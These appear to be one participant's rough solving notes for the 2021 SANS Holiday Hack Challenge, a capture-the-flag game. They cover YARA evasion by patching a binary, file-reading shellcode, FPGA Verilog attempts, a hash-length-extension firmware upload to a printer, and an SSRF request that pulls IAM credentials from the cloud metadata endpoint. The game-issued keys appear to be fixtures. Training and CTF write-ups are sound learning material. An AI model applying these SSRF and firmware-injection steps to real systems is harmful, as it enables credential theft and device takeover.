Randomly got in url 
❄🎁⛄🎄🎅❄

Forsty chilbrain - klatu baradu nikto

# cmdlong - grep challenge
1. 62078
2. 8080
3. 26054
4. 14372
5. 402
6. 12
cat bigscan.gnmap | grep -n -o "open"

iwlist
iwconfig
curl

# logic cruncher
was a game

# yara terminal

https://www.varonis.com/blog/yara-rules/
yara rule 135 is triggerred line 4373
sed "4373, 4473!d" yara_rules/rules.yar

rule yara_rule_135 {
   meta:
      description = "binaries - file Sugar_in_the_machinery"
      author = "Sparkle Redberry"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-21"
      hash = "19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488"
   strings:
      $s = "candycane"
   condition:
      $s
}

thinking about converting it into binary

{NotReallyAFlag}

yara 1056

cat yara_rules/rules.yar | grep -A 20 "yara_rule_1056"
rule yara_rule_1056 {
        description = "binaries - file frosty.exe"
        author = "Sparkle Redberry"
        reference = "North Pole Malware Research Lab"
        date = "1955-04-21"
        hash = "b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03"
    strings:
        $s1 = {6c 6962 632e 736f 2e36}
        $hs2 = {726f 6772 616d 2121}
    condition:
        all of them
}

yara 1732

ule yara_rule_1732 {
   meta:
      description = "binaries - alwayz_winter.exe"
      author = "Santa"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-22"
      hash = "c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8"
   strings:
      $s1 = "This is critical for the execution of this program!!" fullword ascii
      $s2 = "__frame_dummy_init_array_entry" fullword ascii
      $s3 = ".note.gnu.property" fullword ascii
      $s4 = ".eh_frame_hdr" fullword ascii
      $s5 = "__FRAME_END__" fullword ascii
      $s6 = "__GNU_EH_FRAME_HDR" fullword ascii
      $s7 = "frame_dummy" fullword ascii
      $s8 = ".note.gnu.build-id" fullword ascii
      $s9 = "completed.8060" fullword ascii
      $s10 = "_IO_stdin_used" fullword ascii
      $s11 = ".note.ABI-tag" fullword ascii
      $s12 = "naughty string" fullword ascii
      $s13 = "dastardly string" fullword ascii
      $s14 = "__do_global_dtors_aux_fini_array_entry" fullword ascii
      $s15 = "__libc_start_main@@GLIBC_2.2.5" fullword ascii
      $s16 = "GLIBC_2.2.5" fullword ascii
      $s17 = "its_a_holly_jolly_variable" fullword ascii
      $s18 = "__cxa_finalize" fullword ascii
      $s19 = "HolidayHackChallenge{NotReallyAFlag}" fullword ascii
      $s20 = "__libc_csu_init" fullword ascii
   condition:
      uint32(1) == 0x02464c45 and filesize < 50KB and
      10 of them
}

dd if=/dev/zero of=the_non bs=1MiB count=1 conv=notrunc oflag=append

snowball2@3a54e3a1fc6a:~$ ./the_non
Machine Running.. 
Toy Levels: Very Merry, Terry
Naughty/Nice Blockchain Assessment: Untampered
Candy Sweetness Gauge: Exceedingly Sugarlicious
Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564

use vim to open then use :%!xxd to hexdump go down to candycane change it.  also change 726f 6772 626d 2121 nearby (ascii: is program!!). finally run dd if=/dev/zero of=the_non bs=1MiB count=1 conv=notrunc oflag=append to change file size

# shellcode primer
https://tracer.kringlecastle.com/ - do it

in challenge 4 error
```
; TODO: Find the syscall number for sys_exit and put it in rax
mov rax, 60h
; TODO: Put the exit_code we want (99) in rdi
mov rdi, 99h
; Perform the actual syscall
syscall
```
![](ar_erro.png)

```
; TODO: Get a reference to this string into the correct register
db 'Hello World!',0

; Set up a call to sys_write
; TODO: Set rax to the correct syscall number for sys_write
mov rax, 1

; TODO: Set rdi to the first argument (the file descriptor, 1)
mov rdi, 1

; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
mov rsi, db

; TODO: Set rdx to the third argument (length of the string, in bytes)
mov rdx, 12
; Perform the syscall
syscall

; Return cleanly
ret
```

```
; TODO: Get a reference to this string into the correct register
msg:
db 'Hello World!',0

; Set up a call to sys_write
; TODO: Set rax to the correct syscall number for sys_write

mov rax, 1
; TODO: Set rdi to the first argument (the file descriptor, 1)

mov rdi, 1
; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
call msg
pop rsi
;mov rsi, msg

; TODO: Set rdx to the third argument (length of the string, in bytes)
mov rdx, 12

; Perform the syscall
syscall

; Return cleanly
ret
```

final 

```
; TODO: Get a reference to this
call msg
db '/var/northpolesecrets.txt',0
msg:
pop rdi

; TODO: Call sys_open
mov rax, 2
mov rsi,0
mov rdx,0
syscall

; TODO: Call sys_read on the file handle and read it into rsp
mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 500
syscall

; TODO: Call sys_write to write the contents from rsp to stdout (1)
mov rdi, 1
mov rax, 1
mov rsi, rsp
mov rdx, 500
;rsi already in place
syscall

; TODO: Call sys_exit
mov rax, 60
mov rdi, 0
syscall
```

Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.

# rubber ducky usb device
ickymcgoop

# printer exploytation
ruby cyster

# front door frost tower

iwlist scanning
```
Address: 02:4A:46:68:69:21
                    Frequency:5.2 GHz (Channel 40)
                    Quality=48/70  Signal level=-62 dBm  
                    Encryption key:off
                    Bit Rates:400 Mb/s
                    ESSID:"FROST-Nidus-Setup"
```

iwconfig 

# FPGA

nned hints form the slot machine
https://fpga.jackfrosttower.com/?challenge=fpga&id=7cdf2a05-13bd-432b-aee8-e8cb55a5cd46&username=ashwin&area=rooftop&location=13,9#

HINT: 
`If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1`

https://www.youtube.com/watch?v=GFdG1PJ4QjA

changing actual digitallogic circuitry

Trademarkphrse -  let me talk you your manager

https://www.fpga4fun.com/


always @(posedge clk) begin
        if (counter == N) begin
            counter <= 0;
            waveout <= ~ waveout;
        end else begin
            counter <= counter + 1;
        end
    end

understanding FPGA : https://www.intel.com/content/dam/www/programmable/us/en/pdfs/literature/misc/fpgas-for-dummies-ebook.pdf

```
`timescale 1ns / 1ps

module tone_generator(
	input clk,
	input rst,
    input [31:0] freq,
	output wave_out
);

	// Input clock is 100MHz
	localparam CLOCK_FREQUENCY = 100000000;

	// Counter for toggling of clock
	integer counter = 0;
	
	reg wave_out_reg = 0;
	assign wave_out = wave_out_reg;

 always @(posedge clk) begin
 
		if (rst) begin
			counter <= 8'h00;
			wave_out_reg	 <= 1'b0;
		end
	
		else begin 
			
			// If counter is zero, toggle wave_out_reg 
			if (counter == 8'h00) begin
				wave_out_reg <= ~wave_out_reg;
				
				// Generate 1Hz Frequency
				counter <= CLOCK_FREQUENCY/2 - 1;  
			end 
			
			// Else count down
			else 
				counter <= counter - 1; 
			end
		end
		
endmodule
```

square wave output generated:

```
// Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA.
// The CQC-11 operates with a 125MHz clock.
// Your design for a tone generator must support the following 
// inputs/outputs:
// (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL
// REQUIRES THE USE OF THESE NAMES!)
// input clk - this will be connected to the 125MHz system clock
// input rst - this will be connected to the system board's reset bus
// input freq - a 32 bit integer indicating the required frequency
//              (0 - 9999.99Hz) formatted as follows:
//              32'hf1206 or 32'd987654 = 9876.54Hz
// output wave_out - a square wave output of the desired frequency
// you can create whatever other variables you need, but remember
// to initialize them to something!

`timescale 1ns/1ns
module tone_generator (
    input clk,
    input rst,
    input [31:0] freq,
    output wave_out
);
    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
    // TODO: Add your code below. 
    // Remove the following line and add your own implementation. 
    // Note: It's silly, but it compiles...
	
    // 	localparam CLOCK_FREQUENCY = freq;

	// Counter for toggling of clock
	integer counter = 0;

	reg wave_out_reg = 0;
	assign wave_out = wave_out_reg;

    always @(posedge clk) begin
 
		if (rst) begin
			counter <= 32'h00;
			wave_out_reg	 <= 1'b0;
		end
	
		else begin 
			// If counter is zero, toggle wave_out_reg 
			if (counter == 32'h00) begin
				wave_out_reg <= ~wave_out_reg;
				
				// Generate 1Hz Frequency
				counter <= freq/2 - 1;  
			end 
			
			// Else count down
			else 
				counter <= counter - 1; 
			end
		end
		
endmodule
```

counter <= freq * 5/2; gives close to 499

Sending code for analysis...
Verilog parsed cleanly...
Beginning FPGA simulation. This may take a few seconds...
Sorry!
Simulation results indicate a frequency of: 500.0160Hz
You should be able to generate EXACTLY 500.0000Hz...

// Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA.
// The CQC-11 operates with a 125MHz clock.
// Your design for a tone generator must support the following 
// inputs/outputs:
// (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL
// REQUIRES THE USE OF THESE NAMES!)
// input clk - this will be connected to the 125MHz system clock
// input rst - this will be connected to the system board's reset bus
// input freq - a 32 bit integer indicating the required frequency
//              (0 - 9999.99Hz) formatted as follows:
//              32'hf1206 or 32'd987654 = 9876.54Hz
// output wave_out - a square wave output of the desired frequency
// you can create whatever other variables you need, but remember
// to initialize them to something!
```
`timescale 1ns/1ns
module tone_generator (
    input clk,
    input rst,
    input [31:0] freq,
    output wave_out
);
    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
    // TODO: Add your code below. 
    // Remove the following line and add your own implementation. 
    // Note: It's silly, but it compiles...
	
    // 	localparam CLOCK_FREQUENCY = freq;

	// Counter for toggling of clock
	integer counter = 0;

	reg wave_out_reg = 0;
	assign wave_out = wave_out_reg;

    always @(posedge clk) begin
 
		if (rst) begin
			counter <= 32'h00;
			wave_out_reg	 <= 1'b0;
		end
	
		else begin 
			// If counter is zero, toggle wave_out_reg 
			if (counter == 32'h00) begin
				wave_out_reg <= ~wave_out_reg;
				
				// Generate 1Hz Frequency
				//counter <= freq/2 - 1;
				counter <= freq/2 * 5;
			end 
			
			// Else count down
			else 
				counter <= counter - 1; 
			end
		end
		
endmodule
```
Sending code for analysis...
Verilog parsed cleanly...
Beginning FPGA simulation. This may take a few seconds...
Sorry!
Simulation results indicate a frequency of: 499.9960Hz
You should be able to generate EXACTLY 500.0000Hz...

`If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1`

```
`timescale 1ns/1ns
module tone_generator (
    input clk,
    input rst,
    input [31:0] freq,
    output wave_out
);
    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
    // TODO: Add your code below. 
    // Remove the following line and add your own implementation. 
    // Note: It's silly, but it compiles...
	
    // 	localparam CLOCK_FREQUENCY = freq;

	// Counter for toggling of clock
	integer counter = 0;

	reg wave_out_reg = 0;
	assign wave_out = wave_out_reg;

    always @(posedge clk) begin
 
		if (rst) begin
			counter <= 32'h00;
			wave_out_reg	 <= 1'b0;
		end
	
		else begin 
			// If counter is zero, toggle wave_out_reg 
			if (counter == 32'h00) begin
				wave_out_reg <= ~wave_out_reg;
				
				// Generate 1Hz Frequency
				//counter <= freq/2 - 1;
				
				counter <= $rtoi(freq/2 * 5);
				// if ($rtoi(counter * 10) - ($rtoi(counter) * 10) > 4) begin
				//     counter <= counter + 1;
				// end
			end 
			
			// Else count down
			else 
				counter <= counter - 1; 
			end
		end
		
endmodule
```
```
Sending code for analysis...
Verilog parsed cleanly...
Synthesizing/implementing design and generating bitstream.
Bitstream will then be sent to device.
This will take SEVERAL seconds...
Code changed! Resetting some simulation results...

Seriously!?! Did you really think that would work?
Your code no longer matches with what you used to run previous tests and that seems suspicious...
Your User ID has been logged. If you continue down this misguided path, I'll be forced to add your name to the naughty list.
                                        - Prof. Qwerty Petabyt
```

Final code 

```
`timescale 1ns/1ns
module tone_generator (
    input clk,
    input rst,
    input [31:0] freq,
    output wave_out
);
    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
    // TODO: Add your code below. 
    // Remove the following line and add your own implementation. 
    // Note: It's silly, but it compiles...
	
    // 	localparam CLOCK_FREQUENCY = freq;

	// Counter for toggling of clock
	reg[31:0] counter = 0.00;

	reg wave_out_reg = 0;
	assign wave_out = wave_out_reg;
	localparam CLOCK_FREQUENCY = 12500000.00;

    always @(posedge clk) begin
 
		if (rst) begin
			counter <= 32'h00;
			wave_out_reg	 <= 1'b0;
		end
	
		else begin 
			// If counter is zero, toggle wave_out_reg 
			if (counter == 32'h00) begin
				wave_out_reg <= ~wave_out_reg;
				
				// Generate 1Hz Frequency
				//counter <= freq/2 - 1;
				
				counter <= $rtoi((CLOCK_FREQUENCY/freq) * 500 -1);
				// if ($rtoi(counter * 10) - ($rtoi(counter) * 10) > 4) begin
				//     counter <= (CLOCK_FREQUENCY/freq) * 50 ;
				// end
				// else begin
				//     counter <= (CLOCK_FREQUENCY/freq) * 50 -1 ;
				// end
			end 
			
			// Else count down
			else 
				counter <= counter - 1; 
			end
		end
		
endmodule

```
# printer exploitation

https://printer.kringlecastle.com/

steps

1. Get the firmware-export.json file
2. extract the zip using base64 -d 
3. make the c code get the compiled code as firmware.bin
4. zip the firmware code
5. convert zip to executable through xxd -p name_of_zip
This is a shell code.
6. remove all newline using gedit

put it in te hasextender

```
../hash_extender --file downloaded.zip --secret 16 --append 504b03041403000008000106985396dfb96edc090000783f00000c0000006669726d776172652e62696eed5b6b4c1c5514be33cbc2a27659b0b554aaac6f7c30800f442b7617583a185ab182ef3a0cbb03bb765fd99d55501351ac76adf848343126fac71835faa39a98d8fe684b685aeb0fd36a6d1a4d236d6c8ac62aad8fd0d8b29e3b7b26c3bdb0d21f26c6643e32fbdd73eef9ce7dcc5dd80d739e0a74b68b82404c38c8ed845ac39ebced43fff4cd06a1af899c0baf17938b4831d84556dc1c0e8b2cbbcc7150f73efa795e4e58162c065d61c8c52c138fa5735af61c3e24320c7e6e3c2ffa39be4fb098d7d1294cd6520bb899e55e1c6723379e88ba69d44d37b33c2198ccee67115e3b311fcf6d84e522e4aea37a88b63db81e9e6f23c89cee2ed01593b38707792d8e57685f2a459605d4d545237d8d37d64543b5d1483c33583bd8d458db78a3944e48d71b735a8c676ad59a1eb2febae323d97b0facf870f8cdc31f7de6e95811187abd08e720600cc1786318e452ebbe41e369c34d7de7c0b54ffb3276cbc94dcb4901dc8f478201e6ab2073b1b880bfb880bfa1803f5360dcaa02f1cf1688bf142f1e8be02a27cb48af8f3d6f2499d1d324998ac4f57e92d6435a2a45d243695d8b91fec752115d238a121c5495fe485c8d461ea726dcc1a092d6d594aec4d4489c509bdec046b2aab3a3a555b95eba5eba89281dddab1548a70d44205baa7b756b3411d7bad5be28cd31104bc43187920f9d3790eebb883fd0428b42809fd659e7317361a49440df6a629e43769dbde5799ee2fc5ef4fbac7d61ec832badfb29100b13b3fc4e6261d2f2c36561caf2c31816a667f94b8905f33e39f1dc9aa8447f099e7513de597e07b15063fab9dfb7f5961f2e1b366cd8b061c3860d1bff37c8233fbbe44dce4375d0dcb04317737be5919dae71622277d311e8ca5df103bc9655fba045ed3001fc3891035cf12db5056aef35ecafa82d527b87617f416d07b5371bf63360f7bf42100dc73bb2fb1e96b347e4911fa6baba3b479db782561e5df4b540a9798cce614923687e2fab6e335cafd65172be40e996697d094cdf8dd32fcd4d94550f13c03832c4ab46fc4d0f50ba7a46ce4ec963bfac94c7a61db2b04bde37a32f860447a57c02576ea21fc6b1f4c3cdfe3aa04c5d8f3cd2bc4ba219b347f5f3e44dcd22f8276b6145936178d9e55c06b6b0ced499fce313d0d9031af9e99f09ac6c77e03475c39047249a6b6cab13cc6d427eaa2937e4dc3393cbc9a31b08a5ad5a309cf05e15d6e42dd168c2fb881a5c2f673d725676c9dbaef2deee55257d50deae7baff4c6d687227236097d8395f2d69437447d8fca5b8c10dd5b2767bbbca0ab91b7a9c924fd365d276f4f66faa291601dd5d583ae49de1a0f266291f8008df6edf6c954dbbfdbd7a9137342d9dd93a5c0d9c0e9599e636772b94d81d3d95db0844f1711f219014c9e00afd1da33de2f95553f4b28fcf7768e3627ae85c63d1dd903fe9e8eec1ffe6e7ff6748f3c5adb0beebb3baf3e43cfe46410d4f2d819875ed5f05d5935e9cc9eecccfed2963de6cf2dfe5e1e1917e45b0e657ea267f5c175fe87fcebfc0ffb9571881bc7339d3fc5366cd8b061c3860d1b366cd8b061c300fe9f4c0e7476ad245784cea1769563c56df87f25cf542eb711b81778337012f83ee09e13b9dce7d47f12befc02ef00ae17f0ff9a66dec7d71261d023549d57e27a4528f150ff72cc792dc6148e27e4728c1ffe3597eb2200b7a7dd5d7947d9b98fb986c9ca0b575c73c3e5979afa36b8de87381741a0f621b836c078029d9bdfed794e6c5d542c9e8611f29a27e99a602deba8a0c5ed7959ec7057bee408b8bda3450177cd8bce3677fd73c5b2bb69a46495dbf788bbc9efaef7bb6b5adcde167725c4b7b85dc403d29d706d843c02b161c3860d1b366cd8b061c3868dff1ee6738c5e6401fdadc8e7710fea2e42737f459e9771cf4756a1ed42be10790afb9773fd7fcce41286edc8db4ef43715e5b918ed7aec3f07edb791cf45ae445e4258808c79f05c34d7cd7dcf2c415e8a3ce964fd1e273bef83c8a5dcf87fe5e87aacd019b4a7703d39b405735fd03e80fda7d07690ff16f85cf91c34e2396847be07b91f9970cfbbae6a6dbdd55bd3a6f545d4b8b7a15eba41aaaf6d68b81a9ba410f0f9fa1339ce8dcf623bc8a4c83e767f7e81f88b8d7bee269bb9f979d13fc1f96f403fbc1f187418e32e23611ffb3ee931da8bf17c5b7812f3f4727936d27898ed2417ff1e3fff05d6b5c5c85341ba2fe13a0ac4efc66cfc3c0f1a7996ccb9df87319e9fe7ef84a21ceb002c940834cf527c9f5938067e91be4bb97dbe08fc15b03f7b2bd8fdac15f09e7278cff05792262e7f8791672e1e00bf07e2652efe2a1a2f9691fd9c482d90472fe07fbe80ff5d1c979fe72705d63506fe72b192f8b8f82f05639741c4d6571cc27d4be2e0ebd0ff355c1e389f492ecf87186fd6ed5c8bfee3423e9edf9f5318afe1b9354b80660aacb75ca4d7dc7dbe489c7fbd378bf3d713ac150bd413dc1d4ce90d5282288ada17517475808023ad67fafba520b1ea01143da604e983fe69880c25948168a24f8d2a213d914a2b6a66900413b16454d3b590543f7f042d4988286a2aa50e295a5c4f0d91fe941ad3945026161b02c92c4b81489d09d506b56046d7141825a6c643521004ed6bfdab034a604d1b2d49602521a2b4ddbfc6bfbaa395ed312a18c00595284a40c60c72db5aa2aceabcb3c5dfa9dcd9de7e77a05be9f6b7740614b3762298ce1893ffc71a095a97e1630a2ab490aaab589c31bb07ab37d860be4a83eba5a9f2bd7c3106f4a5134a183625aac104ef848e5024ae64d25a68f6fc61fa54da974e631a3a08968c7063c1b270570b157a7045264c022c4a615c444a0fc574b50f584fe5396cb62271c89d24523ca16bd2403c23f56522506d1409a1cbdfd2514b4fa5d11756d361228586e290cf60c892ef79544ba52389386328d097d2a22a0dc45632aa13c9d80bda940612d0d0b54178a537188212c64d93b4309ec77028655944b2ce525e816d3a821a8b0409cd981f249f07f69b48f4d0c23126ff06aaf077b9480ad5efb11038fb32ae1685af57bb9c8b2fe2ec464e3f29b2ec5d40df06d79ff019ccd4bb1c2cd7a0df69f673fa35f899d4d4d73b5876096cfd8f8bfbfc780f577fd654c4f2db0becdfc3f819d3d41f2862f9026efe22c7ebf133ab694f15b1ec25fcfc593c8e7b6aea3d4e960f72e3f3eb7f16f52dd6e770867b67e997cea37fc9aad5c381595ebac0fdcf727aaf87e52e2edec3f16b9c3ee96199df2f17c76f71fa610fcb7789fcf82cdee1f4fb2b582e5d60fd1f70ef5fbeaed5bd80fe63563fb76e7401fd764edfe565d925f0fbc7620fced141b83ad2dab3dbff6fe02a9ba59f6a463e4bfd61dc7bd0b375bab56c7d6e31a7f320bf81eb073dd60b22d7e5b96681f17fe2f4c4875c9fa7a605f4bf71fa261f32ea3d73f42c4ea1cfc1d51dca05f45ece9ec1f1211cc1eaab39bf300f8b642ec2a8f716597f8796ccf3fba314e7ce63e38d79d6447e7c16e505f4c71bcdef49ffacff1b504b01023f031403000008000106985396dfb96edc090000783f00000c0024000000000000002080ed81000000006669726d776172652e62696e0a002000000000000100180080feb9cf89f8d70180feb9cf89f8d70180feb9cf89f8d701504b050600000000010001005e000000060a00000000 --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 -f sha256 --out-data-format hex
```

7. remove /n and convert the output into bin and `base 64` encode

8. remove all newline

9. put it back in json and give




What dowe need todo? we can put in our own code in the firmware.


look in hashextender/final_solution

Troll_Pay_Chart.xlsx

# IMDS

```cmd
}elfu@d65bce7e3f36:~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document |jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   451  100   451    0     0   440k      0 --:--:-- --:--:-- --:--:--  440k
{
  "accountId": "PCRVQVHN4S0L4V2TE",
  "imageId": "ami-0b69ea66ff7391e80",
  "availabilityZone": "np-north-1f",
  "ramdiskId": null,
  "kernelId": null,
  "devpayProductCodes": null,
  "marketplaceProductCodes": null,
  "version": "2017-09-30",
  "privateIp": "10.0.7.10",
  "billingProducts": null,
  "instanceId": "i-1234567890abcdef0",
  "pendingTime": "2021-12-01T07:02:24Z",
  "architecture": "x86_64",
  "instanceType": "m4.xlarge",
  "region": "np-north-1"
}
```

meta-data
```
}elfu@d65bce7e3f36:~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document |jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   451  100   451    0     0   440k      0 --:--:-- --:--:-- --:--:--  440k
{
  "accountId": "PCRVQVHN4S0L4V2TE",
  "imageId": "ami-0b69ea66ff7391e80",
  "availabilityZone": "np-north-1f",
  "ramdiskId": null,
  "kernelId": null,
  "devpayProductCodes": null,
  "marketplaceProductCodes": null,
  "version": "2017-09-30",
  "privateIp": "10.0.7.10",
  "billingProducts": null,
  "instanceId": "i-1234567890abcdef0",
  "pendingTime": "2021-12-01T07:02:24Z",
  "architecture": "x86_64",
  "instanceType": "m4.xlarge",
  "region": "np-north-1"
}
```

`http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role ; echo`

elfu-deploy-role

```
elfu@d65bce7e3f36:~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role ; echo
{
        "Code": "Success",
        "LastUpdated": "2021-12-02T18:50:40Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
        "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
        "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
        "Expiration": "2026-12-02T18:50:40Z"
}
```

For IMDSv2 access, you must request a token from the IMDS server using the
X-aws-ec2-metadata-token-ttl-seconds header to indicate how long you want the token to be
used for (between 1 and 21,600 secods).
Examine the contents of the 'gettoken.sh' script in the current directory using 'cat'.

elfu@d65bce7e3f36:~$ echo $TOKEN
Uv38ByGCZU8WP18PmmIdcpVmx00QA3xNe7sEB9Hixkk=

`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region`

noxious o dor: anytimr yousee url for input try ssf

# Slots machine

HTTP/2 200 OK
Date: Sun, 12 Dec 2021 06:33:32 GMT
Date: Sun, 12 Dec 2021 06:33:32 GMT
X-Powered-By: PHP/7.4.26
Cache-Control: no-cache, private
Content-Type: application/json
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 58
Access-Control-Allow-Origin: *
Via: 1.1 google
Alt-Svc: clear

{"success":true,"data":{"credit":176,"jackpot":0,"free_spin":0,"free_num":0,"scaler":0,"num_line":20,"bet_amount":1,"pull":{"WinAmount":0,"FreeSpin":0,"WildFixedIcons":[],"HasJackpot":false,"HasScatter":false,"WildColumIcon":"","ScatterPrize":0,"SlotIcons":["icon2","icon1","icon9","icon5","icon5","icon7","icon9","icon10","icon9","icon10","icon1","scatter","icon5","icon9","icon3"],"ActiveIcons":[],"ActiveLines":[]},"response":"Woweee!"},"message":"Spin success"}

# pcap analysis
for pcap: https://apackets.com/pcaps/flows

Snooty+lady
Yaqh - 1024

Bluk - human

Quib - ugly little man


Urgh - stupid man

Kraq - rude couple

Stuv - grumpy man

Gavk - annoying woman

Bloz - nasty bad woman

Euuk - Ugly mean couple

Crag - Bald man

Klug - funny looking man

Hagg - Incredibly angry lady - 1st 1024

Muffy+VonDuchess+Sebastian - complained error room 1024

Wukk - crabby woman

Ikky - Family in room

Flud - very cranky lady 2nd 1024

Muffy+VonDuchess+Sebastian 

Flud Hagg Yaqh

# applying for jack frost tower IMDS exploitation

Not able to run the same commands, dir buster?

SSRF in file upload lets try and input something out of theworld in file input

https://apply.jackfrosttower.com/?inputName=s&inputEmail=s@s.c&inputPhone=s&inputField=Crayon%20on%20walls&resumeFile=%22file://images/4.jpg%22&inputWorkSample=file://images/4.jpg&additionalInformation=werwerwer&submit=file://images/4.jpg


cheat from https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf#:~:text=etc/passwd%22%3E%5C%3C/iframe%3E%5C%0A%0A%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D-,__AWS%3A__,-http%3A//instance%2Ddata

got an invalid name input


ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/ami
block-device-mapping/ebs0
block-device-mapping/ephemeral0
block-device-mapping/root
block-device-mapping/swap
elastic-inference/associations
elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
events/maintenance/scheduled
events/recommendations/rebalance
hostname
iam/info
iam/security-credentials
iam/security-credentials/jf-deploy-role
instance-action
instance-id
instance-life-cycle
instance-type
latest
latest/api/token
local-hostname
local-ipv4
mac
network/interfaces/macs/0e:49:61:0f:c3:11/device-number
network/interfaces/macs/0e:49:61:0f:c3:11/interface-id
network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54
network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s
network/interfaces/macs/0e:49:61:0f:c3:11/local-hostname
network/interfaces/macs/0e:49:61:0f:c3:11/local-ipv4s
network/interfaces/macs/0e:49:61:0f:c3:11/mac
network/interfaces/macs/0e:49:61:0f:c3:11/owner-id
network/interfaces/macs/0e:49:61:0f:c3:11/public-hostname
network/interfaces/macs/0e:49:61:0f:c3:11/public-ipv4s
network/interfaces/macs/0e:49:61:0f:c3:11/security-group-ids
network/interfaces/macs/0e:49:61:0f:c3:11/security-groups
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-id
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv4-cidr-block
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv6-cidr-blocks
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-id
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-block
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-blocks
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv6-cidr-blocks
placement/availability-zone
placement/availability-zone-id
placement/group-name
placement/host-id
placement/partition-number
placement/region
product-codes
public-hostname
public-ipv4
public-keys/0/openssh-key
reservation-id
security-groups
services/domain
services/partition
spot/instance-action
spot/termination-time

GET /?inputName=jf&inputEmail=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&inputPhone=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&resumeFile=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&additionalInformation=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&submit= HTTP/2

{
	"Code": "Success",
	"LastUpdated": "2021-05-02T18:50:40Z",
	"Type": "AWS-HMAC",
	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
	"Expiration": "2026-05-02T18:50:40Z"
}


# elf moving 

Guide 
```python
import elf, munchkins, levers, lollipops, yeeters, pits
# Grab our lever object
lever = levers.get(0)
munchkin = munchkins.get(0)
lollipop = lollipops.get(0)
# move to lever position
elf.moveTo(lever.position)
# get lever int and add 2 and submit val
leverData = lever.data() + 2
lever.pull(leverData)
# Grab lollipop and stand next to munchkin
elf.moveLeft(1)
elf.moveUp(8)
# Solve the munchkin's challenge
munchList = munchkin.ask() # e.g. [1, 3, "a", "b", 4]
answer_list = []
for elem in munchList:
    if type(elem) == int:
        answer_list.append(elem)
munchkin.answer(answer_list)
elf.moveUp(2) # Move to finish
```

1. 

elf.moveLeft(10)
elf.moveUp(100)

2. 

```python
import elf, munchkins, levers, lollipops, yeeters, pits


all_lollipops = lollipops.get()
elf.moveTo(all_lollipops[1].position)
elf.moveTo(all_lollipops[0].position)
elf.moveLeft(3)
elf.moveUp(100)
```

3. 

lever0 = levers.get(0)
lollipop0 = lollipops.get(0)

leverdata = lever0.data() + 2
